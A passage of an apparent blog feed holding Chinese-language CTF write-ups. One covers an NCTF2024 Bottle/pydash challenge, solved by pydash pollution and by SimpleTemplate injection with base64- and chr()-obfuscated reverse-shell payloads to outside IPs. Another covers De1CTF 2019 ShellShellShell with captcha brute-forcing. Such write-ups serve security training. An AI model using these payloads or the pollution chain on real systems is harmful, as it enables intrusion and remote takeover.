class="string">&quot;render&quot;</span>,</span><br><span class="line">               ]</span><br><span class="line">__forbidden_name__=[</span><br><span class="line">    <span class="string">&quot;bottle&quot;</span></span><br><span class="line">]</span><br><span class="line">__forbidden_name__.extend(<span class="built_in">dir</span>(<span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setval</span>(<span class="params">name:<span class="built_in">str</span>, path:<span class="built_in">str</span>, value:<span class="built_in">str</span></span>)-&gt; <span class="type">Optional</span>[<span class="built_in">bool</span>]:</span><br><span class="line">    <span class="keyword">if</span> name.find(<span class="string">&quot;__&quot;</span>)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_name__:</span><br><span class="line">        <span class="keyword">if</span> name==word:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_path__:</span><br><span class="line">        <span class="keyword">if</span> path.find(word)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    obj=<span class="built_in">globals</span>()[name]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.post(<span class="params"><span class="string">&#x27;/setValue&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_value</span>():</span><br><span class="line">    name = bottle.request.query.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    path=bottle.request.json.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(path,<span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name)&gt;<span class="number">6</span> <span class="keyword">or</span> <span class="built_in">len</span>(path)&gt;<span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    value=bottle.request.json.get(<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;yes&quot;</span> <span class="keyword">if</span> setval(name, path, value) <span class="keyword">else</span> <span class="string">&quot;no&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.get(<span class="params"><span class="string">&#x27;/render&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>():</span><br><span class="line">    path=bottle.request.query.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> path.find(<span class="string">&quot;&#123;&quot;</span>)&gt;=<span class="number">0</span> <span class="keyword">or</span> path.find(<span class="string">&quot;&#125;&quot;</span>)&gt;=<span class="number">0</span> <span class="keyword">or</span> path.find(<span class="string">&quot;.&quot;</span>)&gt;=<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hacker&quot;</span></span><br><span class="line">    <span class="keyword">return</span> bottle.template(path)</span><br><span class="line">bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><h5 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h5><p>我们来看&#x2F;setValue和&#x2F;render路由，在理想情况下，render路由只能渲染文件，而不是传入的字符串。但是我们看到</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@classmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">cls, name, lookup=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">    Search name in all directories specified in lookup.</span></span><br><span class="line"><span class="string">    First without, then with common extensions. Return first hit.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> lookup:</span><br><span class="line">        <span class="keyword">raise</span> depr(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&quot;Empty template lookup path.&quot;</span>, <span class="string">&quot;Configure a template lookup path.&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> os.path.isabs(name):</span><br><span class="line">        <span class="keyword">raise</span> depr(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&quot;Use of absolute path for template name.&quot;</span>, <span class="string">&quot;Refer to templates with names or paths relative to the lookup path.&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> spath <span class="keyword">in</span> lookup:</span><br><span class="line">        spath = os.path.abspath(spath) + os.sep</span><br><span class="line">        fname = os.path.abspath(os.path.join(spath, name))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> fname.startswith(spath): <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(fname): <span class="keyword">return</span> fname</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> ext <span class="keyword">in</span> cls.extensions:</span><br><span class="line">            <span class="keyword">if</span> os.path.isfile(<span class="string">&#x27;%s.%s&#x27;</span> % (fname, ext)):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;%s.%s&#x27;</span> % (fname, ext)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们最终找到BaseTemplate的search方法，可以看到是没办法使用..&#x2F;..&#x2F;来逃逸的，所以我们需要想办法去修改TEMPLATE_PATH，然后去实现任意文件读取，接下来看setval函数</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">setval</span>(<span class="params">name:<span class="built_in">str</span>, path:<span class="built_in">str</span>, value:<span class="built_in">str</span></span>)-&gt; <span class="type">Optional</span>[<span class="built_in">bool</span>]:</span><br><span class="line">    <span class="keyword">if</span> name.find(<span class="string">&quot;__&quot;</span>)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_name__:</span><br><span class="line">        <span class="keyword">if</span> name==word:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_path__:</span><br><span class="line">        <span class="keyword">if</span> path.find(word)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    obj=<span class="built_in">globals</span>()[name]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>结合黑名单和限制袋大概的利用是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setval.__globals__.bottle.TEMPLATE=[&#x27;../../../../../proc/self/&#x27;]</span><br></pre></td></tr></table></figure><p>但是pydash是不允许去修改<code>__globals__</code>属性的内容的，我们看下代码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">base_set</span>(<span class="params">obj, key, value, allow_override=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Set an object&#x27;s `key` to `value`. If `obj` is a ``list`` and the `key` is</span></span><br><span class="line"><span class="string">    the next available index position, append to list; otherwise, pad the list </span></span><br><span class="line"><span class="string">    with ``None`` and then append to the list.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj: Object to assign value to.</span></span><br><span class="line"><span class="string">        key: Key or index to assign to.</span></span><br><span class="line"><span class="string">        value: Value to assign.</span></span><br><span class="line"><span class="string">        allow_override: Whether to allow overriding a previously set key.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">dict</span>):</span><br><span class="line">        <span class="keyword">if</span> allow_override <span class="keyword">or</span> key <span class="keyword">not</span> <span class="keyword">in</span> obj:</span><br><span class="line">            obj[key] = value</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">list</span>):</span><br><span class="line">        key = <span class="built_in">int</span>(key)</span><br><span class="line">        <span class="keyword">if</span> key &lt; <span class="built_in">len</span>(obj):</span><br><span class="line">            <span class="keyword">if</span> allow_override:</span><br><span class="line">                obj[key] = value</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> key &gt; <span class="built_in">len</span>(obj):</span><br><span class="line">                <span class="comment"># Pad list object with None values up to the index key,</span></span><br><span class="line">                <span class="comment"># so we can append the value into the key index.</span></span><br><span class="line">                obj[:] = (obj + [<span class="literal">None</span>] * key)[:key]</span><br><span class="line">            obj.append(value)</span><br><span class="line">    <span class="keyword">elif</span> (allow_override <span class="keyword">or</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(obj, key)) <span class="keyword">and</span> obj <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        _raise_if_restricted_key(key)</span><br><span class="line">        <span class="built_in">setattr</span>(obj, key, value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> obj</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_raise_if_restricted_key</span>(<span class="params">key</span>):</span><br><span class="line"><span class="comment"># Prevent access to restricted keys for security reasons.</span></span><br><span class="line"><span class="keyword">if</span> key <span class="keyword">in</span> RESTRICTED_KEYS:</span><br><span class="line"><span class="keyword">raise</span> KeyError(<span class="string">f&quot;access to restricted key <span class="subst">&#123;key!r&#125;</span> is not allowed&quot;</span>)</span><br></pre></td></tr></table></figure><p>所以可以先利⽤这个setval将RESTRICTED_KEYS修改</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503250931489.png" alt="image-20250325093112295" loading="lazy"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/setValue?name=pydash</span><br><span class="line">&#123;&quot;path&quot;:&quot;helpers.RESTRICTED_KEYS&quot;,&quot;value&quot;:[]&#125;</span><br></pre></td></tr></table></figure><p>然后再去修改</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503251558265.png" alt="image-20250325155830121" loading="lazy"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/setValue?name=setval</span><br><span class="line">&#123;&quot;path&quot;:&quot;__globals__.bottle.TEMPLATE_PATH&quot;,&quot;value&quot;:[&quot;../../../../../proc/self/&quot;]&#125;</span><br></pre></td></tr></table></figure><p>然后在&#x2F;render路由get传参，得到flag</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503251559549.png" alt="image-20250325155959467" loading="lazy"></p><h5 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h5><p>在**<code>Bottle</code>** 的默认模板引擎 **<code>SimpleTemplate</code>**，支持类似于 &lt;% 和 %&gt; 的语法来嵌入和执行 Python 代码，所以直接在render路由传参数然后反弹shell即可</p><p>payload1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;% from os import system</span><br><span class="line">from base64 import b64encode, b64decode</span><br><span class="line">print(b64decode(&#x27;YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC82MC4yMDQuMTU4Ljg3LzIzMzMgMD4mMSI=&#x27;)</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>payload2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% getattr(__import__(&#x27;o&#x27;+&#x27;s&#x27;), &#x27;sy&#x27;+&#x27;stem&#x27;)(chr(98)+chr(97)+chr(115)+chr(104)+chr(32)+chr(45)+chr(99)+chr(32)+chr(34)+chr(98)+chr(97)+chr(115)+chr(104)+chr(32)+chr(45)+chr(105)+chr(32)+chr(62)+chr(38)+chr(32)+chr(47)+chr(100)+chr(101)+chr(118)+chr(47)+chr(116)+chr(99)+chr(112)+chr(47)+chr(49)+chr(49)+chr(51)+chr(46)+chr(52)+chr(52)+chr(46)+chr(49)+chr(53)+chr(56)+chr(46)+chr(55)+chr(50)+chr(47)+chr(49)+chr(49)+chr(52)+chr(53)+chr(49)+chr(32)+chr(48)+chr(62)+chr(38)+chr(49)+chr(34)) %&gt;</span><br></pre></td></tr></table></figure><h4 id="internal-api（利⽤-HTTP-Status-Code-进⾏-XSLeaks）"><a href="#internal-api（利⽤-HTTP-Status-Code-进⾏-XSLeaks）" class="headerlink" title="internal_api（利⽤ HTTP Status Code 进⾏ XSLeaks）"></a>internal_api（利⽤ HTTP Status Code 进⾏ XSLeaks）</h4><h4 id="H2-Revenge"><a href="#H2-Revenge" class="headerlink" title="H2 Revenge"></a>H2 Revenge</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;NCTF2024&quot;&gt;&lt;a href=&quot;#NCTF2024&quot; class=&quot;headerlink&quot; title=&quot;NCTF2024&quot;&gt;&lt;/a&gt;NCTF2024&lt;/h3&gt;&lt;h3 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="比赛复现" scheme="https://kinseyy.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>[De1CTF 2019]ShellShellShell</title>
    <link href="https://kinseyy.github.io/2025/03/18/De1CTF-2019-ShellShellShell/"/>
    <id>https://kinseyy.github.io/2025/03/18/De1CTF-2019-ShellShellShell/</id>
    <published>2025-03-18T11:31:43.000Z</published>
    <updated>2025-03-18T13:50:23.331Z</updated>
    
    <content type="html"><![CDATA[<h2 id="De1CTF-2019-ShellShellShell"><a href="#De1CTF-2019-ShellShellShell" class="headerlink" title="[De1CTF 2019]ShellShellShell"></a>[De1CTF 2019]ShellShellShell</h2><p>我们将login换成register能进行注册账号</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503181949918.png" alt="image-20250318194937694" loading="lazy"></p><p>但注册账号我们需要验证码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;<span class="number">10000000000</span> ; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>), <span class="number">0</span>, <span class="number">5</span>) === <span class="string">&quot;28647&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们尝试注册admin，发现注册失败，可能后面我们需要登录admin</p><p>我们在这先创建一个test账号</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503181951823.png" alt="image-20250318195137765" loading="lazy"></p><p>登录进来了，我们能在publish处上传emoji表情包</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503181955144.png" alt="image-20250318195501117" loading="lazy"></p><p>然后不知道咋做了，那我们就扫描目录</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503181955673.png" alt="image-20250318195552602" loading="lazy"></p><p>我们访问views能看到源码</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503181956800.png" alt="image-20250318195622733" loading="lazy"></p><p>我们能在里面下载下源码</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;user.php&#x27;</span>;</span><br><span class="line"><span class="variable">$C</span> = <span class="keyword">new</span> <span class="title class_">Customer</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">    <span class="variable">$allow</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="variable">$white_action</span> = <span class="string">&quot;delete|index|login|logout|phpinfo|profile|publish|register&quot;</span>;</span><br><span class="line">    <span class="variable">$vpattern</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>,<span class="variable">$white_action</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$vpattern</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$value</span>/i&quot;</span>, <span class="variable">$action</span> ) &amp;&amp;  (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>,<span class="variable">$action</span>))   )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$allow</span>=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$allow</span>==<span class="number">1</span>)</span><br><span class="line">    &#123;<span class="keyword">require_once</span> <span class="string">&#x27;views/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Get out hacker!&lt;br&gt;jaivy&#x27;s laji waf.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php?action=login&#x27;</span>);</span><br></pre></td></tr></table></figure><p><strong>user.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Customer</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>, <span class="variable">$userid</span>, <span class="variable">$is_admin</span>, <span class="variable">$allow_diff_ip</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])?<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]:<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;userid = <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;userid&#x27;</span>])?<span class="variable">$_SESSION</span>[<span class="string">&#x27;userid&#x27;</span>]:-<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;is_admin = <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>])?<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>]:<span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_allow_diff_ip</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;userid&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_username</span>(<span class="params"><span class="variable">$username</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/is&#x27;</span>,<span class="variable">$username</span>) <span class="keyword">or</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)&lt;<span class="number">3</span> <span class="keyword">or</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)&gt;<span class="number">20</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span 